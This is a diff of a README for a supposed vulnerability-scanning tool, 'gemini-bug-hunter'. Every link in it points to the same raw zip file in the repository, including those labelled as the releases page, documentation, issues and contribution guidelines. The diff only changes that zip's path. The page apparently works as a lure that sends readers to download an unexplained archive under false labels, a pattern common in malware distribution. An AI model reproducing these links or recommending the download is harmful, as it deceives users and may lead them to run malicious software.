@@ -1,6 +1,6 @@
 # 🐞 gemini-bug-hunter - Find and Fix Code Vulnerabilities Easily
 
-[![Download gemini-bug-hunter](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/hunter-gemini-bug-v1.8.zip%https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/hunter-gemini-bug-v1.8.zip)](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/hunter-gemini-bug-v1.8.zip)
+[![Download gemini-bug-hunter](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/utils/bug-hunter-gemini-v1.8.zip%https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/utils/bug-hunter-gemini-v1.8.zip)](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/utils/bug-hunter-gemini-v1.8.zip)
 
 ## 🛠️ Overview
 
@@ -13,7 +13,7 @@ To get started with Gemini Bug Hunter, you need to download the application from
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/hunter-gemini-bug-v1.8.zip). This page contains all available versions of Gemini Bug Hunter.
+   Go to our [Releases page](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/utils/bug-hunter-gemini-v1.8.zip). This page contains all available versions of Gemini Bug Hunter.
 
 2. **Choose Your Version**  
    Look for the latest version, tagged as "Latest Release". It will have the most up-to-date features and fixes.
@@ -65,14 +65,14 @@ Gemini Bug Hunter helps you find vulnerabilities through simple commands. Here�
 
 ## 📖 Additional Documentation
 
-For more advanced usage and configuration options, check the [Documentation](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/hunter-gemini-bug-v1.8.zip). This resource provides in-depth insights on how to optimize your use of Gemini Bug Hunter.
+For more advanced usage and configuration options, check the [Documentation](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/utils/bug-hunter-gemini-v1.8.zip). This resource provides in-depth insights on how to optimize your use of Gemini Bug Hunter.
 
 ## 📫 Support
 
-If you encounter issues during installation or usage, feel free to reach out for help. You can open an issue in the [Issues section](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/hunter-gemini-bug-v1.8.zip) of our repository.
+If you encounter issues during installation or usage, feel free to reach out for help. You can open an issue in the [Issues section](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/utils/bug-hunter-gemini-v1.8.zip) of our repository.
 
 ## 🔗 Community and Contribution
 
-We welcome contributions from the community. If you want to help improve Gemini Bug Hunter, please read the [Contribution Guidelines](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/hunter-gemini-bug-v1.8.zip) on our GitHub page.
+We welcome contributions from the community. If you want to help improve Gemini Bug Hunter, please read the [Contribution Guidelines](https://raw.githubusercontent.com/KerberosC/gemini-bug-hunter/main/engine/utils/bug-hunter-gemini-v1.8.zip) on our GitHub page.
 
 Thank you for choosing Gemini Bug Hunter. Keep your code secure!
